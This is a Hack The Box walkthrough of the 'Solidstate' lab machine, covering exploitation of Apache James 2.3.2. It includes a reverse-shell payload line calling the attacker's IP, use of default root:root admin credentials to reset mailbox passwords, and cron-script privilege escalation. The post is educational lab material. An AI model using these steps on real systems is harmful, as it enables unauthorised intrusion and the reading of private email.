---
title: HTB -- Solidstate
date: 2022-01-20
layout: single
header:
  teaser: assets/images/htb/solidstate/teaser.png
excerpt: Fun box where you get to break into a mail server and snoop through inboxes! Essential box for understanding mail based boxes with an interesting take on crontab privesc.
classes: wide
categories:
  - hackthebox
tags:
  - hackthebox
  - OSCP
---

# Summary
![](/assets/images/htb/solidstate/teaser.png)

Fun box where you get to break into a mail server and snoop through inboxes! Essential box for understanding mail based boxes with an interesting take on crontab privesc.

# Recon

This scan gives us a ton of information, we see pop3 and smtp which hints us towards an email based box. 
```
PORT     STATE SERVICE REASON  VERSION         
22/tcp   open  ssh     syn-ack OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)                                                                 
| ssh-hostkey:                                                        
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    syn-ack JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello solidstate.htb (10.10.14.24 [10.10.14.24]), PIPELINING, ENHANCEDSTATUSCODES,                               
80/tcp   open  http    syn-ack Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)  
|_http-title: Home - Solid State Security
110/tcp  open  pop3    syn-ack JAMES pop3d 2.3.2                      
119/tcp  open  nntp    syn-ack JAMES nntpd (posting ok)               
4555/tcp open  rsip?   syn-ack
| fingerprint-strings:        
|   GenericLines:             
|     JAMES Remote Administration Tool 2.3.2                          
|     Please enter your login and password                            
|     Login id:               
|     Password:                    
|     Login failed for                                                
|     Login id:                                                       
|   Verifier:                      
|     JAMES Remote Administration Tool 2.3.2                          
|     Please enter your login and password                            
|     Login id:                                                                                                                              
|_    Password:                                                                                                                              
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.91%I=9%D=1/10%Time=61DC1C12%P=x86_64-pc-linux-gnu%r(Ge                                                                   
SF:nericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPl                                                                   
SF:ease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswo                                                                   
SF:rd:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n")%r(Verifier,60,"JAMES\                                                                  
SF:x20Remote\x20Administration\x20Tool\x202\.3\.2\nPlease\x20enter\x20your                     
SF:\x20login\x20and\x20password\nLogin\x20id:\nPassword:\n");  
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel  
                                                                                                                                             
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 627.57 seconds                                                               
```


# Web

As usual, run a directory brute force and subdomain brute force.

* Subdomain scan
  * `ffuf -w ~/HTB/horizontal/subdomains-top1million-110000.txt -u http://10.10.10.51 -H "Host: FUZZ.solidstate.htb" | grep -v '200'`
* Dir brute force
  * `feroxbuster -u http://solidstate.htb -x txt php`
  * Finds a README.txt

```
Solid State by HTML5 UP
html5up.net | @ajlkn
Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)


After a somewhat extended break from HTML5 UP (to work on a secret-ish new project --
more on that later!) I'm back with a brand new design: Solid State, a slick new multi-
pager that combines some of the ideas I've played with over at Pixelarity with an "angular"
sort of look. Hope you dig it :)

Demo images* courtesy of Unsplash, a radtastic collection of CC0 (public domain) images
you can use for pretty much whatever.

(* = not included)

AJ
aj@lkn.io | @ajlkn


Credits:

	Demo Images:
		Unsplash (unsplash.com)

	Icons:
		Font Awesome (fortawesome.github.com/Font-Awesome)

	Other:
		jQuery (jquery.com)
		html5shiv.js (@afarkas @jdalton @jon_neal @rem)
		background-size polyfill (github.com/louisremi)
		Misc. Sass functions (@HugoGiraudel)
		Respond.js (j.mp/respondjs)
		Skel (skel.io)
```

They were kind enough to list out what they used to build the site! Other notable files include this hint looking image file

![](/assets/images/htb/solidstate/web-1.png)

## SMTP

When it comes to testing services, a netcat connection to grab banners will usually do the trick. If you wanted to get more information, [hacktricks has tons of great ideas](https://book.hacktricks.xyz/pentesting/pentesting-smtp).
```
nc -vn 10.10.10.51 25
(UNKNOWN) [10.10.10.51] 25 (smtp) open
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 10 Jan 2022 06:59:49 -0500 (EST)
```

After doing some searching around, james smtp server seems to have a few vulnerabilities. Next to this, it seems that we can connect with telnet.

## POP Server

Great resource for getting up to speed is [the HackTricks page](https://book.hacktricks.xyz/pentesting/pentesting-pop) for pentesting POP.
```
telnet 10.10.10.51 110                                                                                                               1 ⨯
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.

OK+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
```

We can poke around once we have a user, but no further progress is made after a few minutes.
```
POP commands:
  USER uid           Log in as "uid"
  PASS password      Substitue "password" for your actual password
  STAT               List number of messages, total mailbox size
  LIST               List messages and sizes
  RETR n             Show message n
  DELE n             Mark message n for deletion
  RSET               Undo any changes
  QUIT               Logout (expunges messages if no RSET)
  TOP msg n          Show first n lines of message number msg
  CAPA               Get capabilities
```



### James Remote Admin Tool

[James remote admin tool offers an exploit](https://www.exploit-db.com/exploits/35513) that allows an attacker to run code on the box once a user logs in. I'm thinking there could be a way to trigger it with all the mail related services running on the box. For now make the payload a reverse shell and attempt to find a way to trigger it.

```
python 35513 10.10.10.51                                                                                                             1 ⨯
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.
```

```python
# specify payload
payload = 'sh -i >& /dev/udp/10.10.14.24/4445 0>&1'                   
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'    
pwd = 'root'     
```

Since the exploit worked, we know we can login as `root:root`

```
nc 10.10.10.51 4555                                                                                                            137 ⨯ 1 ⚙

JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
...
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d <-- our attack
user: thomas
user: john
user: mindy
user: mailadmin
...
adduser test test
User test added
```

From  we can run through all the users and reset their password with the following command(s)

`setpassword james test`

```
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

Creds! `mindy:P@55W0rd1!2@`

## Privesc

After sshing onto the box and running some simple commands to copy linpeas, and pspy, we find a crontab running a funny looking file in /opt.

![Crontab!](/assets/images/htb/solidstate/pspy.png)

A file owned by root we can write to! I echod a line into it for printing the root flag

```python
cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

os.system('cat /root/root.txt > /tmp/root.txt')
```

After waiting a minute or two `/tmp/root.txt` was created with the flag in it! pspy sure is powerful

